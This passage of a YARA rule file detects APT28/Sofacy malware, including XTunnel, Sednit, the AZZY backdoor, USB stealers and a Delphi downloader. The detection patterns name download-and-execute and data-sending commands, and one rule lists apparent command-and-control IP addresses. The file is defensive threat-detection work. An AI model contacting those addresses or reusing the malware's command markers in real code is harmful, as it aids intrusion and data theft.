$key105 = { C25CC4E671CAAA31E137700A9DB3A272D4E157A6A1F47235043D954BAE8A3C70 }\n        $key106 = { E6005757CA0189AC38F9B6D5AD584881399F28DA949A0F98D8A4E3862E20F715 }\n        $key107 = { 204E6CEB4FF59787EF4D5C9CA5A41DDF4445B9D8E0C970B86D543E9C7435B194 }\n        $key108 = { 831D7FD21316590263B69E095ABBE89E01A176E16AE799D83BD774AF0D254390 }\n        $key109 = { 42C36355D9BC573D72F546CDB12E6BB2CFE2933AC92C12040386B310ABF6A1ED }\n        $key110 = { B9044393C09AD03390160041446BF3134D864D16B25F1AB5E5CDC690C4677E7D }\n        $key111 = { 6BC1102B5BE05EEBF65E2C3ACA1F4E17A59B2E57FB480DE016D371DA3AEF57A5 }\n        $key112 = { B068D00B482FF73F8D23795743C76FE8639D405EE54D3EFB20AFD55A9E2DFF4E }\n        $key113 = { 95CF5ADDFE511C8C7496E3B75D52A0C0EFE01ED52D5DD04D0CA6A7ABD3A6F968 }\n        $key114 = { 75534574A4620019F8E3D055367016255034FA7D91CBCA9E717149441742AC8D }\n        $key115 = { 96F1013A5301534BE424A11A94B740E5EB3A627D052D1B769E64BAB6A666433C }\n        $key116 = { 584477AB45CAF729EE9844834F84683ABECAB7C4F7D23A9636F54CDD5B8F19B3 }\n        $key117 = { D3905F185B564149EE85CC3D093477C8FF2F8CF601C68C38BBD81517672ECA3A }\n        $key118 = { BF29521A7F94636D1930AA236422EB6351775A523DE68AF9BF9F1026CEDA618D }\n        $key119 = { 04B3A783470AF1613A9B849FBD6F020EE65C612343EB1C028B2C28590789E60B }\n        $key120 = { 3D8D8E84977FE5D21B6971D8D873E7BED048E21333FE15BE2B3D1732C7FD3D04 }\n        $key121 = { 8ACB88224B6EF466D7653EB0D8256EA86D50BBA14FD05F7A0E77ACD574E9D9FF }\n        $key122 = { B46121FFCF1565A77AA45752C9C5FB3716B6D8658737DF95AE8B6A2374432228 }\n        $key123 = { A4432874588D1BD2317224FB371F324DD60AB25D4191F2F01C5C13909F35B943 }\n        $key124 = { 78E1B7D06ED2A2A044C69B7CE6CDC9BCD77C19180D0B082A671BBA06507349C8 }\n        $key125 = { 540198C3D33A631801FE94E7CB5DA3A2D9BCBAE7C7C3112EDECB342F3F7DF793 }\n        $key126 = { 7E905652CAB96ACBB7FEB2825B55243511DF1CD8A22D0680F83AAF37B8A7CB36 }\n        $key127 = { 37218801DBF2CD92F07F154CD53981E6189DBFBACAC53BC200EAFAB891C5EEC8 }\n\n    condition:\n        any of them\n}\n\nrule APT28_IMPLANT_5_v3\n{\n    meta:\n        description = \"XTunnel Implant by APT28\"\n        threat_names = \"XTunnel, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_5_v3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $BYTES1 = { 0F AF C0 6? C0 07 00 00 00 2D 01 00 00 00 0F AF ?? 39 ?8 }\n        $BYTES2 = { 0F AF C0 6? C0 07 48 0F AF ?? 39 ?8 }\n\n    condition:\n        any of them\n}\n\nrule APT28_IMPLANT_5_v4\n{\n    meta:\n        description = \"XTunnel Implant by APT28\"\n        threat_names = \"XTunnel, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_5_v4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $FBKEY1 = { 987AB999FE0924A2DF0A412B14E26093746FCDF9BA31DC05536892C33B116AD3 }\n        $FBKEY2 = { 8B236C892D902B0C9A6D37AE4F9842C3070FBDC14099C6930158563C6AC00FF5 }\n        $FBKEY3 = { E47B7F110CAA1DA617545567EC972AF3A6E7B4E6807B7981D3CFBD3D8FCC3373 }\n        $FBKEY4 = { 48B284545CA1FA74F64FDBE2E605D68CED8A726D05EBEFD9BAAC164A7949BDC1 }\n        $FBKEY5 = { FB421558E30FCCD95FA7BC45AC92D2991C44072230F6FBEAA211341B5BF2DC56 }\n\n    condition:\n        all of them\n}\n\nrule APT28_IMPLANT_6_v1\n{\n    meta:\n        description = \"Sednit / EVILTOSS Implant by APT28\"\n        threat_names = \"Sednit/EVILTOSS, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_6_v1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = \"dll.dll\" wide ascii\n        $STR2 = \"Init1\" wide ascii\n        $STR3 = \"netui.dll\" wide ascii\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_6_v2\n{\n    meta:\n        description = \"Sednit / EVILTOSS Implant by APT28\"\n        threat_names = \"Sednit/EVILTOSS, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_6_v2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $obf_func = { 8B 45 F8 6A 07 03 C7 33 D2 89 45 E8 8D 47 01 5B 02 4D 0F F7 F3 6A 07 8A 04 32 33 D2 F6 E9 8A C8 8B C7 F7 F3 8A 44 3E FE 02 45 FC 02 0C 32 B2 03 F6 EA 8A D8 8D 47 FF 33 D2 5F F7 F7 02 5D 14 8B 45 E8 8B 7D F4 C0 E3 06 02 1C 32 32 CB 30 08 8B 4D 14 41 47 83 FF 09 89 4D 14 89 7D F4 72 A1 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_6_v3\n{\n    meta:\n        description = \"Sednit / EVILTOSS Implant by APT28\"\n        threat_names = \"Sednit/EVILTOSS, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_6_v3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $deob_func = { 8D 46 01 02 D1 83 E0 07 8A 04 38 F6 EA 8B D6 83 E2 07 0A\n         04 3A 33 D2 8A 54 37 FE 03 D3 03 D1 D3 EA 32 C2 8D 56 FF 83 E2 07 8A\n         1C 3A 8A 14 2E 32 C3 32 D0 41 88 14 2E 46 83 FE 0A 7C ?? }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_6_v4\n{\n    meta:\n        description = \"Sednit / EVILTOSS Implant by APT28\"\n        threat_names = \"Sednit/EVILTOSS, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_6_v4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ASM = {53 5? 5? [6-15] ff d? 8b ?? b? a0 86 01 00 [7-13] ff d? ?b\n         [6-10] c0 [0-1] c3}\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_6_v5\n{\n    meta:\n        description = \"Sednit / EVILTOSS Implant by APT28\"\n        threat_names = \"Sednit/EVILTOSS, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_6_v5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 83 EC 18 8B 4C 24 24 B8 AB AA AA AA F7 E1 8B 44 24 20 53 55 8B\n         EA 8D 14 08 B8 AB AA AA AA 89 54 24 1C F7 E2 56 8B F2 C1 ED 02 8B DD\n         57 8B 7C 24 38 89 6C 24 1C C1 EE 02 3B DE 89 5C 24 18 89 74 24 20 0F\n         83 CF 00 00 00 8D 14 5B 8D 44 12 FE 89 44 24 10 3B DD 0F 85 CF 00 00\n         00 8B C1 33 D2 B9 06 00 00 00 F7 F1 8B CA 83 F9 06 89 4C 24 38 0F 83\n         86 00 00 00 8A C3 B2 06 F6 EA 8B 54 24 10 88 44 24 30 8B 44 24 2C 8D\n         71 02 03 D0 89 54 24 14 8B 54 24 10 33 C0 8A 44 37 FE 03 D6 8B D8 8D\n         46 FF 0F AF DA 33 D2 BD 06 00 00 00 F7 F5 C1 EB 07 8A 04 3A 33 D2 32\n         D8 8D 46 01 F7 F5 8A 44 24 30 02 C1 8A 0C 3A 33 D2 32 C8 8B C6 F7 F5\n         8A 04 3A 22 C8 8B 44 24 14 02 D9 8A 0C 30 32 CB 88 0C 30 8B 4C 24 38\n         41 46 83 FE 08 89 4C 24 38 72 A1 8B 5C 24 18 8B 6C 24 1C 8B 74 24 20\n         8B 4C 24 10 43 83 C1 06 3B DE 89 4C 24 10 8B 4C 24 34 89 5C 24 18 0F\n         82 3C FF FF FF 3B DD 75 1A 8B C1 33 D2 B9 06 00 00 00 F7 F1 8B CA EB\n         0D 33 C9 89 4C 24 38 E9 40 FF FF FF 33 C9 8B 44 24 24 33 D2 BE 06 00\n         00 00 89 4C 24 38 F7 F6 3B CA 89 54 24 24 0F 83 95 00 00 00 8A C3 B2\n         06 F6 EA 8D 1C 5B 88 44 24 30 8B 44 24 2C 8D 71 02 D1 E3 89 5C 24 34\n         8D 54 03 FE 89 54 24 14 EB 04 8B 5C 24 34 33 C0 BD 06 00 00 00 8A 44\n         3E FE 8B D0 8D 44 1E FE 0F AF D0 C1 EA 07 89 54 24 2C 8D 46 FF 33 D2\n         BB 06 00 00 00 F7 F3 8B 5C 24 2C 8A 04 3A 33 D2 32 D8 8D 46 01 F7 F5\n         8A 44 24 30 02 C1 8A 0C 3A 33 D2 32 C8 8B C6 F7 F5 8A 04 3A 22 C8 8B\n         44 24 14 02 D9 8A 0C 06 32 CB 88 0C 06 8B 4C 24 38 8B 44 24 24 41 46\n         3B C8 89 4C 24 38 72 8F 5F 5E 5D 5B 83 C4 18 C2 10 00 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_6_v6\n{\n    meta:\n        description = \"Sednit / EVILTOSS Implant by APT28\"\n        threat_names = \"Sednit/EVILTOSS, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_6_v6\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $Init1_fun = {68 10 27 00 00 FF 15 ?? ?? ?? ?? A1 ?? ?? ?? ?? 6A FF 50\n         FF 15 ?? ?? ?? ?? 33 C0 C3}\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_HospitalityMalware_document\n{\n    meta:\n        description = \"Yara Rule for APT28_Hospitality_Malware document identification\"\n        threat_names = \"APT28\"\n        ref = \"http://csecybsec.com/download/zlab/APT28_Hospitality_Malware_report.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CSE CybSec Enterprise - Z-Lab\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT28_HospitalityMalware_document\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = {75 52 B9 ED 1B D6 83 0F DB 24 CA 87 4F 5F 25 36 BF 66 BA}\n        $b = {EC 3B 6D 74 5B C5 95 F3 9E 24 5B FE 4A 64 C7 09 CE 07 C9 58 4E 62 3B}\n\n    condition:\n        all of them and filesize > 75KB and filesize < 82KB\n}\n\nrule APT28_HospitalityMalware_mvtband_file\n{\n    meta:\n        description = \"Mvtband.dll malware\"\n        threat_names = \"APT28\"\n        ref = \"http://csecybsec.com/download/zlab/APT28_Hospitality_Malware_report.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CSE CybSec Enterprise - Z-Lab\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT28_HospitalityMalware_mvtband_file\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"DGMNOEP\"\n        $b = {C7 45 94 0A 25 73 30 8D 45 94}\n\n    condition:\n        all of them and pe.sections[2].raw_data_size == 0\n}\n\nrule APT28_COZY_FANCY_BEAR_Hunt\n{\n    meta:\n        description = \"Cozy Bear / Fancy Bear C2 Server IPs\"\n        threat_names = \"APT28\"\n        ref = \"https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"COZY_FANCY_BEAR_Hunt\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"185.100.84.134\" ascii wide fullword\n        $s2 = \"58.49.58.58\" ascii wide fullword\n        $s3 = \"218.1.98.203\" ascii wide fullword\n        $s4 = \"187.33.33.8\" ascii wide fullword\n        $s5 = \"185.86.148.227\" ascii wide fullword\n        $s6 = \"45.32.129.185\" ascii wide fullword\n        $s7 = \"23.227.196.217\" ascii wide fullword\n\n    condition:\n        uint16(0) == 0x5a4d and 1 of them\n}\n\nrule APT28_APT_fancybear_Downdelph_magic : Bootkit\n{\n    meta:\n        description = \"APT28 downdelph magic string\"\n        threat_names = \"APT28\"\n        ref = \"https://www.threatminer.org/_reports/2016/eset-sednit-part3%20-%20ESET.pdf#viewer.action=download\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc Salinas @Bondey_m\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_fancybear_Downdelph_magic\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \" :3 \"\n\n    condition:\n        $str1 at 0\n}\n\nrule APT28_APT_fancybear_Downdelph_MBR : Bootkit\n{\n    meta:\n        description = \"APT28 downdelph string on MBR (get your MBR with BOOTICE on Win or #dd if=/dev/sda of=./sda.mbr bs=512 count=1\"\n        threat_names = \"APT28\"\n        ref = \"https://www.threatminer.org/_reports/2016/eset-sednit-part3%20-%20ESET.pdf#viewer.action=download\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc Salinas @Bondey_m\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_fancybear_Downdelph_MBR\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = { 20 3A 33 20 }\n\n    condition:\n        $s1 at 411\n}\n\nrule APT28_MAL_FancyBear_ComputraceAgent\n{\n    meta:\n        description = \"Absolute Computrace Agent Executable\"\n        threat_names = \"APT28\"\n        ref = \"https://asert.arbornetworks.com/lojack-becomes-a-double-agent/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"ASERT - Arbor Networks (slightly modified by Florian Roth)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_FancyBear_ComputraceAgent\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = { D1 E0 F5 8B 4D 0C 83 D1 00 8B EC FF 33 83 C3 04 }\n        $b1 = { 72 70 63 6E 65 74 70 2E 65 78 65 00 72 70 63 6E 65 74 70 00 }\n        $b2 = { 54 61 67 49 64 00 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and ($a or ($b1 and $b2))\n}\n\nrule APT28_MAL_Sednit_DelphiDownloader_Apr18_2\n{\n    meta:\n        description = \"Malware from Sednit Delphi Downloader report\"\n        threat_names = \"APT28\"\n        ref = \"https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_Sednit_DelphiDownloader_Apr18_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"2D444F574E4C4F41445F53544152542D\" ascii\n        $ = \"55504C4F41445F414E445F455845435554455F46494C45\" ascii\n        $ = \"4D6F7A696C6C612076352E31202857696E646F7773204E5420362E313B2072763A362E302E3129204765636B6F2F32303130303130312046697265666F782F36\" ascii\n        $ = \"41646F62654461696C79557064617465\" ascii\n        $ = \"53595354454D494E464F2026205441534B4C495354\" ascii\n        $ = \"6373727376632E657865\" ascii\n        $ = \"536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E\" ascii\n        $ = \"5C536F6674776172655C4D6963726F736F66745C57696E646F7773204E545C43757272656E7456657273696F6E\" ascii\n        $ = \"5C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E\" ascii\n        $ = \"2D444F574E4C4F41445F53544152542D\" ascii\n\n    condition:\n        filesize < 4000KB and 1 of them\n}\n\nrule APT28_MAL_Sednit_DelphiDownloader_Apr18_3\n{\n    meta:\n        description = \"Malware from Sednit Delphi Downloader report\"\n        threat_names = \"APT28\"\n        ref = \"https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_Sednit_DelphiDownloader_Apr18_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"Processor Level: \" fullword ascii\n        $ = \"CONNECTION ERROR\" fullword ascii\n        $ = \"FILE_EXECUTE_AND_KILL_MYSELF\" ascii\n        $ = \"-KILL_PROCESS-\" fullword ascii\n        $ = \"-FILE_EXECUTE-\" fullword ascii\n        $ = \"-DOWNLOAD_ERROR-\" fullword ascii\n        $ = \"CMD_EXECUTE\" fullword ascii\n        $ = \"\\\\Interface\\\\Office\\\\{31E12FE8-937F-1E32-871D-B1C9AOEF4D4}\\\\\" fullword ascii\n        $ = \"Mozilla/3.0 (compatible; Indy Library)\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and 3 of them\n}\n\nrule APT28_Malware_StrangeSpaces\n{\n    meta:\n        description = \"Strings from Sofacy malware with many spaces\"\n        threat_names = \"APT28\"\n        ref = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_Malware_StrangeSpaces\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Delete Temp Folder Service                                  \" fullword wide\n        $s3 = \" Operating System                        \" fullword wide\n        $s4 = \"Microsoft Corporation                                       \" fullword wide\n        $s5 = \" Microsoft Corporation. All rights reserved.               \" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and 3 of them\n}\n\nrule APT28_Malware_AZZY_Backdoor_1\n{\n    meta:\n        description = \"AZZY Backdoor - Sample 1\"\n        threat_names = \"AZZY, APT28\"\n        ref = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_Malware_AZZY_Backdoor_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"advstorshell.dll\" fullword wide\n        $s1 = \"advshellstore.dll\" fullword ascii\n        $s2 = \"Windows Advanced Storage Shell Extension DLL\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}\n\nrule APT28_AZZY_Backdoor_Implant_1\n{\n    meta:\n        description = \"AZZY Backdoor Implant 4.3 - Sample 1\"\n        threat_names = \"AZZY, APT28\"\n        ref = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_AZZY_Backdoor_Implant_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\tf394kv.dll\" fullword wide\n        $s2 = \"DWN_DLL_MAIN.dll\" fullword ascii\n        $s3 = \"?SendDataToServer_2@@YGHPAEKEPAPAEPAK@Z\" ascii\n        $s4 = \"?Applicate@@YGHXZ\" ascii\n        $s5 = \"?k@@YGPAUHINSTANCE__@@PBD@Z\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and 2 of them\n}\n\nrule APT28_AZZY_Backdoor_HelperDLL\n{\n    meta:\n        description = \"Dropped C&C helper DLL for AZZY 4.3\"\n        threat_names = \"AZZY, APT28\"\n        ref = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_AZZY_Backdoor_HelperDLL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"snd.dll\" fullword ascii\n        $s1 = \"InternetExchange\" fullword ascii\n        $s2 = \"SendData\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule APT28_CollectorStealer_Gen1\n{\n    meta:\n        description = \"Sofacy Malware Collector Stealer\"\n        threat_names = \"APT28\"\n        ref = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_CollectorStealer_Gen1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"NvCpld.dll\" fullword ascii\n        $s1 = \"NvStop\" fullword ascii\n        $s2 = \"NvStart\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule APT28_CollectorStealer_Gen2\n{\n    meta:\n        description = \"File collectors / USB stealers - Generic\"\n        threat_names = \"APT28\"\n        ref = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_CollectorStealer_Gen2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"msdetltemp.dll\" fullword ascii\n        $s2 = \"msdeltemp.dll\" fullword wide\n        $s3 = \"Delete Temp Folder Service\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule APT28_CollectorStealer_Gen3\n{\n    meta:\n        description = \"File collectors / USB stealers - Generic\"\n        threat_names = \"APT28\"\n        ref = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_CollectorStealer_Gen3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"NvCpld.dll\" fullword ascii\n        $s4 = \"NvStart\" fullword ascii\n        $s5 = \"NvStop\" fullword ascii\n        $a1 = \"%.4d%.2d%.2d%.2d%.2d%.2d%.2d%.4d\" fullword wide\n        $a2 = \"IGFSRVC.dll\" fullword wide\n        $a3 = \"Common User Interface\" fullword wide\n        $a4 = \"igfsrvc Module\" fullword wide\n        $b1 = \" Operating System                        \" fullword wide\n        $b2 = \"Microsoft Corporation                                       \" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and (all of ($s*) and (all of ($a*) or all of ($b*)))\n}\n\nrule APT28_apt_sofacy_xtunnel\n{\n    meta:\n        description = \"Sofacy Malware - German Bundestag\"\n        threat_names = \"APT28\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Claudio Guarnieri\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_sofacy_xtunnel\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $xaps = \":\\\\PROJECT\\\\XAPS_\"\n        $variant11 = \"XAPS_OBJECTIVE.dll\"\n        $variant12 = \"start\"\n        $variant21 = \"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0\"\n        $variant22 = \"is you live?\"\n        $mix1 = \"176.31.112.10\"\n        $mix2 = \"error in select, errno %d\"\n        $mix3 = \"no msg\"\n        $mix4 = \"is you live?\"\n        $mix5 = \"127.0.0.1\"\n        $mix6 = \"err %d\"\n        $mix7 = \"i`m wait\"\n        $mix8 = \"hello\"\n        $mix9 = 